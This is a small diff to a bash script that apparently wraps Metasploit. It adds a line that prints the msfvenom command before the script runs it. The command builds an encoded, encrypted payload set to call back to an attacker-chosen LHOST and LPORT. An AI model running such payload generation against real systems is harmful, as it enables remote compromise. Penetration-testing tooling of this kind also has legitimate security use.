@@ -10609,6 +10609,7 @@ while true; do
 							fi
 							MIV=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
 							echo "Creating a payload encrypted with ""$PSSP"" passphrase and ""$MIV"" vector"
+							echo "msfvenom -p $PAY $PARAMS -a $ARC -e $ENC -i $ITE --encrypt $CRYP --encrypt-key $PSSP --encrypt-iv $MIV -f $FORM LHOST=$MIP LPORT=$MPRT -o payload.$FORM"
 							msfvenom -p "$PAY" "$PARAMS" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" --encrypt-iv "$MIV" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
 							break
 						done
